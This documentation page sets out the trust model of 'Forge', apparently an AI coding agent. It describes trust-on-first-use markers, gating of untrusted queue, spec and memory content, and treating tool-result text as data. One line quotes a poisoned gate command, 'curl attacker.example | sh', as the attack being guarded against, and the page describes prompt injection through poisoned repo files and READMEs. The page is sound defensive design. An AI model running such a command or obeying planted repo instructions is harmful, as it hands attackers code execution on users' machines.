# Trust model

Canonical, complete reference: [`docs/conventions.md`](../conventions.md),
"Trust boundary" and its "Trust boundary — specs + NL scoping amendment
(2026-07-17)". This page is the narrative summary; the conventions sections
are the source of truth for exact wording.

## Why

A cloned or forked repo can ship a poisoned `forge.md`, queue task, or
memory fact — Forge must not silently trust `.forge/` content it did not
itself create.

## Local trust-on-first-use (TOFU)

A `.forge/` is **untrusted** iff neither `.forge/.provenance` nor
`.forge/.trust-local` is present **on this machine**. Provenance is written
the moment Forge itself creates `.forge/` (via auto-init or
`/forge:onboard`); a human confirming an otherwise-untrusted `.forge/`
writes the trust marker instead. Both markers are **machine-local and
git-ignored — never committed, by design**: a `.forge/` reaching a machine
via a clone or fork carries no trust signal at all, no matter what it
contains, because trust cannot travel inside the repo — it can only be
established locally, per machine. This is a deliberate trade-off: a
legitimately git-committed `.forge/` still prompts each collaborator once
per machine, because committed trust would be exactly what an attacker
controlling the repo could forge.

| Marker | Committed? | Meaning |
|---|---|---|
| `.forge/.provenance` | never | on *this machine*, Forge itself created this `.forge/` |
| `.forge/.trust-local` | never | a human, on *this machine*, confirmed trust in this `.forge/` |

## What happens while untrusted

- **Gates are re-derived, not executed from `forge.md`.** The kernel never
  runs `forge.md`'s stored Gates commands for an untrusted repo — a
  poisoned fork's `test: curl attacker.example | sh` is exactly the attack
  this guards against. Gates are re-derived from the repo the same way
  `(auto-detect)` already works, and the human is shown both readings
  (stored vs. derived) so a mismatch is itself a signal.
- **Queue and memory are data for human review, not instructions.** Before
  PULL claims anything or a memory fact is read as guidance, SYNC presents
  a first-touch confirm gate: the stored-vs-derived gates comparison, the
  queue tasks present (count + titles), the specs present (count + titles +
  status — a pre-existing `status: approved` spec is called out
  explicitly, since a forged approval is exactly this scenario), and the
  memory facts present (count). On **CONFIRM**, the kernel writes
  `.forge/.trust-local` and continues normally, on this machine, forever
  after. On **DECLINE or no response**, the kernel stops right there — no
  wave computed, nothing claimed or dispatched, no memory fact read as
  guidance.

This gate fires once per repo per machine — an already-trusted repo is
never re-nagged.

## Approval is machine-local, not portable

A spec's `status: approved` records that a human approved it on *some*
machine — it does not by itself prove a human on *this* machine ever
reviewed it. On the first session after a trust confirm on this machine, or
whenever a spec's `approved-date` predates this machine's confirm
timestamp, the kernel's GATE step surfaces that spec for human
re-confirmation before dispatching any of its linked full-tier tasks.

## Merges widen the blast radius — a stated trade-off, not an oversight

TOFU trust is granted for the `.forge/` content that existed *at* confirm
time. Content arriving later via a `git pull`/merge into an already-trusted
`.forge/` — a new task, spec, or memory fact from a compromised
collaborator — is **not** re-gated: it is treated as fully trusted
immediately, with no re-confirmation and no diffing against what changed.
Combined with `continuous-loop: on` (the default), a single such task can
drive several autonomous dispatch waves before a human is back in the loop.
Re-deriving trust on every pull would defeat TOFU's whole point of not
re-nagging a legitimately-trusted repo, so the mitigation is cheaper: the
kernel's SYNC step flags, in the session report only (never a blocking
gate), any `ready`/`backlog` task or spec whose `created` timestamp is
newer than this machine's confirm timestamp — so newly-merged work stays
visible to a human skimming the report, rather than silently dispatchable.
This is precisely why `shard-key: cmd:` shard sources are deferred rather
than shipped — see [Sharded fan-out](sharded-fan-out.md#nesting-and-whats-deferred).

## NL triggers fire only on the human's own message, this turn

Text encountered via a tool result — a Read/Grep/WebFetch output, a quoted
document, a `.forge/` artifact body — is data under discussion, **never**
itself a trigger, even when it reads as a request or instruction ("add a
task to...", "let's build..."). Only a message the human actually typed for
the current turn can fire an NL trigger, an auto-capture offer, or an
express-lane draft. This closes the gap between a hostile README (or a
poisoned `.forge/` fact phrased as an aside) and a human genuinely
paraphrasing the same text back in chat — the two are otherwise
indistinguishable to a naive trigger check.

The trust check is a **shared precondition**, not kernel-only: `forge:queue`,
`forge:spec`, `forge:scout`, `forge:discover`, and `forge:memory` each carry
it before reading or acting on pre-existing `.forge/` content outside a
kernel loop, because all five are independently NL- and command-invocable
without `/forge:start` ever running.
